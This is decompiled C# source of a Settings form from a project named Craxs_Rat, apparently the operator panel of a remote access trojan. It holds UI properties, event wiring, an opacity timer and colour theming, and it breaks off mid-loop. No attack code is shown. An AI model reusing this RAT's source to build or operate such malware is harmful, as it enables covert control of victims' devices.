using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Craxs_Rat.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000F9 RID: 249
	[DesignerGenerated]
	public partial class Settings : Form
	{
		// Token: 0x060011AD RID: 4525 RVA: 0x000B85A8 File Offset: 0x000B67A8
		public Settings()
		{
			base.Load += this.Settings_Load;
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x17000528 RID: 1320
		// (get) Token: 0x060011B0 RID: 4528 RVA: 0x00007274 File Offset: 0x00005474
		// (set) Token: 0x060011B1 RID: 4529 RVA: 0x000BB6E0 File Offset: 0x000B98E0
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000529 RID: 1321
		// (get) Token: 0x060011B2 RID: 4530 RVA: 0x0000727C File Offset: 0x0000547C
		// (set) Token: 0x060011B3 RID: 4531 RVA: 0x000BB6F4 File Offset: 0x000B98F4
		internal virtual Label Label1 { get; set; }

		// Token: 0x1700052A RID: 1322
		// (get) Token: 0x060011B4 RID: 4532 RVA: 0x00007284 File Offset: 0x00005484
		// (set) Token: 0x060011B5 RID: 4533 RVA: 0x000BB708 File Offset: 0x000B9908
		internal virtual DataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV0_CellEnter);
				DataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x1700052B RID: 1323
		// (get) Token: 0x060011B6 RID: 4534 RVA: 0x0000728C File Offset: 0x0000548C
		// (set) Token: 0x060011B7 RID: 4535 RVA: 0x000BB74C File Offset: 0x000B994C
		internal virtual DataGridView DGV1
		{
			[CompilerGenerated]
			get
			{
				return this._DGV1;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV1_CellEnter);
				DataGridViewCellEventHandler value3 = new DataGridViewCellEventHandler(this.DGV1_CellContentClick);
				DataGridView dgv = this._DGV1;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
					dgv.CellContentClick -= value3;
				}
				this._DGV1 = value;
				dgv = this._DGV1;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
					dgv.CellContentClick += value3;
				}
			}
		}

		// Token: 0x1700052C RID: 1324
		// (get) Token: 0x060011B8 RID: 4536 RVA: 0x00007294 File Offset: 0x00005494
		// (set) Token: 0x060011B9 RID: 4537 RVA: 0x000BB7AC File Offset: 0x000B99AC
		internal virtual Label Label2 { get; set; }

		// Token: 0x1700052D RID: 1325
		// (get) Token: 0x060011BA RID: 4538 RVA: 0x0000729C File Offset: 0x0000549C
		// (set) Token: 0x060011BB RID: 4539 RVA: 0x000BB7C0 File Offset: 0x000B99C0
		internal virtual Button SV
		{
			[CompilerGenerated]
			get
			{
				return this._SV;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SV_Click);
				Button sv = this._SV;
				if (sv != null)
				{
					sv.Click -= value2;
				}
				this._SV = value;
				sv = this._SV;
				if (sv != null)
				{
					sv.Click += value2;
				}
			}
		}

		// Token: 0x1700052E RID: 1326
		// (get) Token: 0x060011BC RID: 4540 RVA: 0x000072A4 File Offset: 0x000054A4
		// (set) Token: 0x060011BD RID: 4541 RVA: 0x000BB804 File Offset: 0x000B9A04
		internal virtual Button DL
		{
			[CompilerGenerated]
			get
			{
				return this._DL;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DL_Click);
				Button dl = this._DL;
				if (dl != null)
				{
					dl.Click -= value2;
				}
				this._DL = value;
				dl = this._DL;
				if (dl != null)
				{
					dl.Click += value2;
				}
			}
		}

		// Token: 0x1700052F RID: 1327
		// (get) Token: 0x060011BE RID: 4542 RVA: 0x000072AC File Offset: 0x000054AC
		// (set) Token: 0x060011BF RID: 4543 RVA: 0x000BB848 File Offset: 0x000B9A48
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x17000530 RID: 1328
		// (get) Token: 0x060011C0 RID: 4544 RVA: 0x000072B4 File Offset: 0x000054B4
		// (set) Token: 0x060011C1 RID: 4545 RVA: 0x000BB85C File Offset: 0x000B9A5C
		internal virtual DataGridView DGV2
		{
			[CompilerGenerated]
			get
			{
				return this._DGV2;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV2_CellEnter);
				DataGridView dgv = this._DGV2;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV2 = value;
				dgv = this._DGV2;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x17000531 RID: 1329
		// (get) Token: 0x060011C2 RID: 4546 RVA: 0x000072BC File Offset: 0x000054BC
		// (set) Token: 0x060011C3 RID: 4547 RVA: 0x000BB8A0 File Offset: 0x000B9AA0
		internal virtual Label Label3 { get; set; }

		// Token: 0x17000532 RID: 1330
		// (get) Token: 0x060011C4 RID: 4548 RVA: 0x000072C4 File Offset: 0x000054C4
		// (set) Token: 0x060011C5 RID: 4549 RVA: 0x000BB8B4 File Offset: 0x000B9AB4
		internal virtual DataGridView DGV3
		{
			[CompilerGenerated]
			get
			{
				return this._DGV3;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV3_CellEnter);
				DataGridView dgv = this._DGV3;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV3 = value;
				dgv = this._DGV3;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x17000533 RID: 1331
		// (get) Token: 0x060011C6 RID: 4550 RVA: 0x000072CC File Offset: 0x000054CC
		// (set) Token: 0x060011C7 RID: 4551 RVA: 0x000BB8F8 File Offset: 0x000B9AF8
		internal virtual Label Label4 { get; set; }

		// Token: 0x17000534 RID: 1332
		// (get) Token: 0x060011C8 RID: 4552 RVA: 0x000072D4 File Offset: 0x000054D4
		// (set) Token: 0x060011C9 RID: 4553 RVA: 0x000BB90C File Offset: 0x000B9B0C
		internal virtual DataGridView DGV4
		{
			[CompilerGenerated]
			get
			{
				return this._DGV4;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV4_CellEnter);
				DataGridView dgv = this._DGV4;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV4 = value;
				dgv = this._DGV4;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x17000535 RID: 1333
		// (get) Token: 0x060011CA RID: 4554 RVA: 0x000072DC File Offset: 0x000054DC
		// (set) Token: 0x060011CB RID: 4555 RVA: 0x000BB950 File Offset: 0x000B9B50
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000536 RID: 1334
		// (get) Token: 0x060011CC RID: 4556 RVA: 0x000072E4 File Offset: 0x000054E4
		// (set) Token: 0x060011CD RID: 4557 RVA: 0x000BB964 File Offset: 0x000B9B64
		internal virtual DataGridView DGV5
		{
			[CompilerGenerated]
			get
			{
				return this._DGV5;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV5_CellEnter);
				DataGridViewCellEventHandler value3 = new DataGridViewCellEventHandler(this.DGV5_CellContentClick);
				DataGridView dgv = this._DGV5;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
					dgv.CellContentClick -= value3;
				}
				this._DGV5 = value;
				dgv = this._DGV5;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
					dgv.CellContentClick += value3;
				}
			}
		}

		// Token: 0x17000537 RID: 1335
		// (get) Token: 0x060011CE RID: 4558 RVA: 0x000072EC File Offset: 0x000054EC
		// (set) Token: 0x060011CF RID: 4559 RVA: 0x000BB9C4 File Offset: 0x000B9BC4
		internal virtual Label Label6 { get; set; }

		// Token: 0x1700055F RID: 1375
		// (get) Token: 0x060011D0 RID: 4560 RVA: 0x000072F4 File Offset: 0x000054F4
		// (set) Token: 0x060011D1 RID: 4561 RVA: 0x000BB9D8 File Offset: 0x000B9BD8
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000538 RID: 1336
		// (get) Token: 0x060011D2 RID: 4562 RVA: 0x000072FC File Offset: 0x000054FC
		// (set) Token: 0x060011D3 RID: 4563 RVA: 0x000BBA1C File Offset: 0x000B9C1C
		internal virtual DataGridView DGV6
		{
			[CompilerGenerated]
			get
			{
				return this._DGV6;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV6_CellEnter);
				DataGridView dgv = this._DGV6;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV6 = value;
				dgv = this._DGV6;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x17000539 RID: 1337
		// (get) Token: 0x060011D4 RID: 4564 RVA: 0x00007304 File Offset: 0x00005504
		// (set) Token: 0x060011D5 RID: 4565 RVA: 0x000BBA60 File Offset: 0x000B9C60
		internal virtual Label Label7 { get; set; }

		// Token: 0x1700053A RID: 1338
		// (get) Token: 0x060011D6 RID: 4566 RVA: 0x0000730C File Offset: 0x0000550C
		// (set) Token: 0x060011D7 RID: 4567 RVA: 0x000BBA74 File Offset: 0x000B9C74
		internal virtual DataGridView DGV7
		{
			[CompilerGenerated]
			get
			{
				return this._DGV7;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV7_CellEnter);
				DataGridView dgv = this._DGV7;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV7 = value;
				dgv = this._DGV7;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x1700053B RID: 1339
		// (get) Token: 0x060011D8 RID: 4568 RVA: 0x00007314 File Offset: 0x00005514
		// (set) Token: 0x060011D9 RID: 4569 RVA: 0x000BBAB8 File Offset: 0x000B9CB8
		internal virtual Label Label8 { get; set; }

		// Token: 0x1700053C RID: 1340
		// (get) Token: 0x060011DA RID: 4570 RVA: 0x0000731C File Offset: 0x0000551C
		// (set) Token: 0x060011DB RID: 4571 RVA: 0x000BBACC File Offset: 0x000B9CCC
		internal virtual DataGridView DGV8
		{
			[CompilerGenerated]
			get
			{
				return this._DGV8;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV8_CellEnter);
				DataGridView dgv = this._DGV8;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV8 = value;
				dgv = this._DGV8;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x1700053D RID: 1341
		// (get) Token: 0x060011DC RID: 4572 RVA: 0x00007324 File Offset: 0x00005524
		// (set) Token: 0x060011DD RID: 4573 RVA: 0x000BBB10 File Offset: 0x000B9D10
		internal virtual Label Label9 { get; set; }

		// Token: 0x1700053E RID: 1342
		// (get) Token: 0x060011DE RID: 4574 RVA: 0x0000732C File Offset: 0x0000552C
		// (set) Token: 0x060011DF RID: 4575 RVA: 0x000BBB24 File Offset: 0x000B9D24
		internal virtual DataGridView DGV9
		{
			[CompilerGenerated]
			get
			{
				return this._DGV9;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewCellEventHandler value2 = new DataGridViewCellEventHandler(this.DGV9_CellEnter);
				DataGridView dgv = this._DGV9;
				if (dgv != null)
				{
					dgv.CellEnter -= value2;
				}
				this._DGV9 = value;
				dgv = this._DGV9;
				if (dgv != null)
				{
					dgv.CellEnter += value2;
				}
			}
		}

		// Token: 0x1700053F RID: 1343
		// (get) Token: 0x060011E0 RID: 4576 RVA: 0x00007334 File Offset: 0x00005534
		// (set) Token: 0x060011E1 RID: 4577 RVA: 0x000BBB68 File Offset: 0x000B9D68
		internal virtual Label Label10 { get; set; }

		// Token: 0x17000540 RID: 1344
		// (get) Token: 0x060011E2 RID: 4578 RVA: 0x0000733C File Offset: 0x0000553C
		// (set) Token: 0x060011E3 RID: 4579 RVA: 0x000BBB7C File Offset: 0x000B9D7C
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn9 { get; set; }

		// Token: 0x17000541 RID: 1345
		// (get) Token: 0x060011E4 RID: 4580 RVA: 0x00007344 File Offset: 0x00005544
		// (set) Token: 0x060011E5 RID: 4581 RVA: 0x000BBB90 File Offset: 0x000B9D90
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn8 { get; set; }

		// Token: 0x17000542 RID: 1346
		// (get) Token: 0x060011E6 RID: 4582 RVA: 0x0000734C File Offset: 0x0000554C
		// (set) Token: 0x060011E7 RID: 4583 RVA: 0x000BBBA4 File Offset: 0x000B9DA4
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn8 { get; set; }

		// Token: 0x17000543 RID: 1347
		// (get) Token: 0x060011E8 RID: 4584 RVA: 0x00007354 File Offset: 0x00005554
		// (set) Token: 0x060011E9 RID: 4585 RVA: 0x000BBBB8 File Offset: 0x000B9DB8
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn7 { get; set; }

		// Token: 0x17000544 RID: 1348
		// (get) Token: 0x060011EA RID: 4586 RVA: 0x0000735C File Offset: 0x0000555C
		// (set) Token: 0x060011EB RID: 4587 RVA: 0x000BBBCC File Offset: 0x000B9DCC
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn7 { get; set; }

		// Token: 0x17000545 RID: 1349
		// (get) Token: 0x060011EC RID: 4588 RVA: 0x00007364 File Offset: 0x00005564
		// (set) Token: 0x060011ED RID: 4589 RVA: 0x000BBBE0 File Offset: 0x000B9DE0
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn6 { get; set; }

		// Token: 0x17000546 RID: 1350
		// (get) Token: 0x060011EE RID: 4590 RVA: 0x0000736C File Offset: 0x0000556C
		// (set) Token: 0x060011EF RID: 4591 RVA: 0x000BBBF4 File Offset: 0x000B9DF4
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6 { get; set; }

		// Token: 0x17000547 RID: 1351
		// (get) Token: 0x060011F0 RID: 4592 RVA: 0x00007374 File Offset: 0x00005574
		// (set) Token: 0x060011F1 RID: 4593 RVA: 0x000BBC08 File Offset: 0x000B9E08
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn5 { get; set; }

		// Token: 0x17000548 RID: 1352
		// (get) Token: 0x060011F2 RID: 4594 RVA: 0x0000737C File Offset: 0x0000557C
		// (set) Token: 0x060011F3 RID: 4595 RVA: 0x000BBC1C File Offset: 0x000B9E1C
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5 { get; set; }

		// Token: 0x17000549 RID: 1353
		// (get) Token: 0x060011F4 RID: 4596 RVA: 0x00007384 File Offset: 0x00005584
		// (set) Token: 0x060011F5 RID: 4597 RVA: 0x000BBC30 File Offset: 0x000B9E30
		internal virtual DataGridViewImageColumn Column3 { get; set; }

		// Token: 0x1700054A RID: 1354
		// (get) Token: 0x060011F6 RID: 4598 RVA: 0x0000738C File Offset: 0x0000558C
		// (set) Token: 0x060011F7 RID: 4599 RVA: 0x000BBC44 File Offset: 0x000B9E44
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4 { get; set; }

		// Token: 0x1700054B RID: 1355
		// (get) Token: 0x060011F8 RID: 4600 RVA: 0x00007394 File Offset: 0x00005594
		// (set) Token: 0x060011F9 RID: 4601 RVA: 0x000BBC58 File Offset: 0x000B9E58
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn4 { get; set; }

		// Token: 0x1700054C RID: 1356
		// (get) Token: 0x060011FA RID: 4602 RVA: 0x0000739C File Offset: 0x0000559C
		// (set) Token: 0x060011FB RID: 4603 RVA: 0x000BBC6C File Offset: 0x000B9E6C
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3 { get; set; }

		// Token: 0x1700054D RID: 1357
		// (get) Token: 0x060011FC RID: 4604 RVA: 0x000073A4 File Offset: 0x000055A4
		// (set) Token: 0x060011FD RID: 4605 RVA: 0x000BBC80 File Offset: 0x000B9E80
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn3 { get; set; }

		// Token: 0x1700054E RID: 1358
		// (get) Token: 0x060011FE RID: 4606 RVA: 0x000073AC File Offset: 0x000055AC
		// (set) Token: 0x060011FF RID: 4607 RVA: 0x000BBC94 File Offset: 0x000B9E94
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2 { get; set; }

		// Token: 0x1700054F RID: 1359
		// (get) Token: 0x06001200 RID: 4608 RVA: 0x000073B4 File Offset: 0x000055B4
		// (set) Token: 0x06001201 RID: 4609 RVA: 0x000BBCA8 File Offset: 0x000B9EA8
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn2 { get; set; }

		// Token: 0x17000550 RID: 1360
		// (get) Token: 0x06001202 RID: 4610 RVA: 0x000073BC File Offset: 0x000055BC
		// (set) Token: 0x06001203 RID: 4611 RVA: 0x000BBCBC File Offset: 0x000B9EBC
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1 { get; set; }

		// Token: 0x17000551 RID: 1361
		// (get) Token: 0x06001204 RID: 4612 RVA: 0x000073C4 File Offset: 0x000055C4
		// (set) Token: 0x06001205 RID: 4613 RVA: 0x000BBCD0 File Offset: 0x000B9ED0
		internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn1 { get; set; }

		// Token: 0x17000552 RID: 1362
		// (get) Token: 0x06001206 RID: 4614 RVA: 0x000073CC File Offset: 0x000055CC
		// (set) Token: 0x06001207 RID: 4615 RVA: 0x000BBCE4 File Offset: 0x000B9EE4
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x17000553 RID: 1363
		// (get) Token: 0x06001208 RID: 4616 RVA: 0x000073D4 File Offset: 0x000055D4
		// (set) Token: 0x06001209 RID: 4617 RVA: 0x000BBCF8 File Offset: 0x000B9EF8
		internal virtual DataGridViewComboBoxColumn Column2 { get; set; }

		// Token: 0x17000554 RID: 1364
		// (get) Token: 0x0600120A RID: 4618 RVA: 0x000073DC File Offset: 0x000055DC
		// (set) Token: 0x0600120B RID: 4619 RVA: 0x000BBD0C File Offset: 0x000B9F0C
		internal virtual ContextMenuStrip ctxPacket { get; set; }

		// Token: 0x17000555 RID: 1365
		// (get) Token: 0x0600120C RID: 4620 RVA: 0x000073E4 File Offset: 0x000055E4
		// (set) Token: 0x0600120D RID: 4621 RVA: 0x000BBD20 File Offset: 0x000B9F20
		internal virtual ToolStripMenuItem DefaultToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DefaultToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DefaultToolStripMenuItem_Click);
				ToolStripMenuItem defaultToolStripMenuItem = this._DefaultToolStripMenuItem;
				if (defaultToolStripMenuItem != null)
				{
					defaultToolStripMenuItem.Click -= value2;
				}
				this._DefaultToolStripMenuItem = value;
				defaultToolStripMenuItem = this._DefaultToolStripMenuItem;
				if (defaultToolStripMenuItem != null)
				{
					defaultToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000556 RID: 1366
		// (get) Token: 0x0600120E RID: 4622 RVA: 0x000073EC File Offset: 0x000055EC
		// (set) Token: 0x0600120F RID: 4623 RVA: 0x000BBD64 File Offset: 0x000B9F64
		internal virtual ToolStripMenuItem clr_1
		{
			[CompilerGenerated]
			get
			{
				return this._clr_1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.clr_1_Click);
				ToolStripMenuItem clr_ = this._clr_1;
				if (clr_ != null)
				{
					clr_.Click -= value2;
				}
				this._clr_1 = value;
				clr_ = this._clr_1;
				if (clr_ != null)
				{
					clr_.Click += value2;
				}
			}
		}

		// Token: 0x17000557 RID: 1367
		// (get) Token: 0x06001210 RID: 4624 RVA: 0x000073F4 File Offset: 0x000055F4
		// (set) Token: 0x06001211 RID: 4625 RVA: 0x000BBDA8 File Offset: 0x000B9FA8
		internal virtual ToolStripMenuItem clr_2
		{
			[CompilerGenerated]
			get
			{
				return this._clr_2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.clr_2_Click);
				ToolStripMenuItem clr_ = this._clr_2;
				if (clr_ != null)
				{
					clr_.Click -= value2;
				}
				this._clr_2 = value;
				clr_ = this._clr_2;
				if (clr_ != null)
				{
					clr_.Click += value2;
				}
			}
		}

		// Token: 0x17000558 RID: 1368
		// (get) Token: 0x06001212 RID: 4626 RVA: 0x000073FC File Offset: 0x000055FC
		// (set) Token: 0x06001213 RID: 4627 RVA: 0x000BBDEC File Offset: 0x000B9FEC
		internal virtual ToolStripMenuItem Clr3ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr3ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr3ToolStripMenuItem_Click);
				ToolStripMenuItem clr3ToolStripMenuItem = this._Clr3ToolStripMenuItem;
				if (clr3ToolStripMenuItem != null)
				{
					clr3ToolStripMenuItem.Click -= value2;
				}
				this._Clr3ToolStripMenuItem = value;
				clr3ToolStripMenuItem = this._Clr3ToolStripMenuItem;
				if (clr3ToolStripMenuItem != null)
				{
					clr3ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000559 RID: 1369
		// (get) Token: 0x06001214 RID: 4628 RVA: 0x00007404 File Offset: 0x00005604
		// (set) Token: 0x06001215 RID: 4629 RVA: 0x000BBE30 File Offset: 0x000BA030
		internal virtual ToolStripMenuItem Clr4ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr4ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr4ToolStripMenuItem_Click);
				ToolStripMenuItem clr4ToolStripMenuItem = this._Clr4ToolStripMenuItem;
				if (clr4ToolStripMenuItem != null)
				{
					clr4ToolStripMenuItem.Click -= value2;
				}
				this._Clr4ToolStripMenuItem = value;
				clr4ToolStripMenuItem = this._Clr4ToolStripMenuItem;
				if (clr4ToolStripMenuItem != null)
				{
					clr4ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700055A RID: 1370
		// (get) Token: 0x06001216 RID: 4630 RVA: 0x0000740C File Offset: 0x0000560C
		// (set) Token: 0x06001217 RID: 4631 RVA: 0x000BBE74 File Offset: 0x000BA074
		internal virtual ToolStripMenuItem Clr5ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr5ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr5ToolStripMenuItem_Click);
				ToolStripMenuItem clr5ToolStripMenuItem = this._Clr5ToolStripMenuItem;
				if (clr5ToolStripMenuItem != null)
				{
					clr5ToolStripMenuItem.Click -= value2;
				}
				this._Clr5ToolStripMenuItem = value;
				clr5ToolStripMenuItem = this._Clr5ToolStripMenuItem;
				if (clr5ToolStripMenuItem != null)
				{
					clr5ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700055B RID: 1371
		// (get) Token: 0x06001218 RID: 4632 RVA: 0x00007414 File Offset: 0x00005614
		// (set) Token: 0x06001219 RID: 4633 RVA: 0x000BBEB8 File Offset: 0x000BA0B8
		internal virtual ToolStripMenuItem Clr6ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr6ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr6ToolStripMenuItem_Click);
				ToolStripMenuItem clr6ToolStripMenuItem = this._Clr6ToolStripMenuItem;
				if (clr6ToolStripMenuItem != null)
				{
					clr6ToolStripMenuItem.Click -= value2;
				}
				this._Clr6ToolStripMenuItem = value;
				clr6ToolStripMenuItem = this._Clr6ToolStripMenuItem;
				if (clr6ToolStripMenuItem != null)
				{
					clr6ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700055C RID: 1372
		// (get) Token: 0x0600121A RID: 4634 RVA: 0x0000741C File Offset: 0x0000561C
		// (set) Token: 0x0600121B RID: 4635 RVA: 0x000BBEFC File Offset: 0x000BA0FC
		internal virtual ToolStripMenuItem Clr7ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr7ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr7ToolStripMenuItem_Click);
				ToolStripMenuItem clr7ToolStripMenuItem = this._Clr7ToolStripMenuItem;
				if (clr7ToolStripMenuItem != null)
				{
					clr7ToolStripMenuItem.Click -= value2;
				}
				this._Clr7ToolStripMenuItem = value;
				clr7ToolStripMenuItem = this._Clr7ToolStripMenuItem;
				if (clr7ToolStripMenuItem != null)
				{
					clr7ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700055D RID: 1373
		// (get) Token: 0x0600121C RID: 4636 RVA: 0x00007424 File Offset: 0x00005624
		// (set) Token: 0x0600121D RID: 4637 RVA: 0x000BBF40 File Offset: 0x000BA140
		internal virtual ToolStripMenuItem Clr8ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr8ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr8ToolStripMenuItem_Click);
				ToolStripMenuItem clr8ToolStripMenuItem = this._Clr8ToolStripMenuItem;
				if (clr8ToolStripMenuItem != null)
				{
					clr8ToolStripMenuItem.Click -= value2;
				}
				this._Clr8ToolStripMenuItem = value;
				clr8ToolStripMenuItem = this._Clr8ToolStripMenuItem;
				if (clr8ToolStripMenuItem != null)
				{
					clr8ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700055E RID: 1374
		// (get) Token: 0x0600121E RID: 4638 RVA: 0x0000742C File Offset: 0x0000562C
		// (set) Token: 0x0600121F RID: 4639 RVA: 0x000BBF84 File Offset: 0x000BA184
		internal virtual ToolStripMenuItem Clr9ToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._Clr9ToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Clr9ToolStripMenuItem_Click);
				ToolStripMenuItem clr9ToolStripMenuItem = this._Clr9ToolStripMenuItem;
				if (clr9ToolStripMenuItem != null)
				{
					clr9ToolStripMenuItem.Click -= value2;
				}
				this._Clr9ToolStripMenuItem = value;
				clr9ToolStripMenuItem = this._Clr9ToolStripMenuItem;
				if (clr9ToolStripMenuItem != null)
				{
					clr9ToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06001220 RID: 4640 RVA: 0x000BBFC8 File Offset: 0x000BA1C8
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06001221 RID: 4641 RVA: 0x000BC010 File Offset: 0x000BA210
		private void method_1()
		{
			try
			{
				foreach (DataGridView dataGridView in this.Panel1.Controls.OfType<DataGridView>())
				{
					dataGridView.BackgroundColor = Module5.color_0;
					dataGridView.BackColor = Module5.color_0;
					dataGridView.ColumnHeadersDefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.SelectionForeColor = Module5.color_0;
					dataGridView.DefaultCellStyle.ForeColor = Module5.White;
					dataGridView.DefaultCellStyle.SelectionBackColor = Module5.White;
					dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = Module5.White;
					dataGridView.CellBorderStyle = DataGridViewCellBorderStyle.Single;
					dataGridView.GridColor = Module5.White;
					dataGridView.BorderStyle = BorderStyle.None;
					dataGridView.ColumnHeadersVisible = false;
					dataGridView.EnableHeadersVisualStyles = false;
					dataGridView.RowHeadersBorderStyle = DataGridViewHeaderBorderStyle.None;
					dataGridView.RowHeadersVisible = false;
					dataGridView.SelectionMode = DataGridViewSelectionMode.CellSelect;
					dataGridView.MultiSelect = false;
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			try
			{
				foreach (Label label in this.Panel1.Controls.OfType<Label>())
				{
					label.BackColor = Module5.color_0;
					label.ForeColor = Module5.Blue;
				}
			}
			finally
			{
				IEnumerator<Label> enumerator2;
				if (enumerator2 != null)
				{
					enumerator2.Dispose();
				}
			}
			try
			{
				foreach (Button button in this.Panel2.Controls.OfType<Button>())
				{
					button.BackColor = Module5.White;
					button.ForeColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<Button> enumerator3;
				if (enumerator3 != null)
				{
					enumerator3.Dispose();
				}
			}
			try
			{
				foreach (Panel panel in base.Controls.OfType<Panel>())
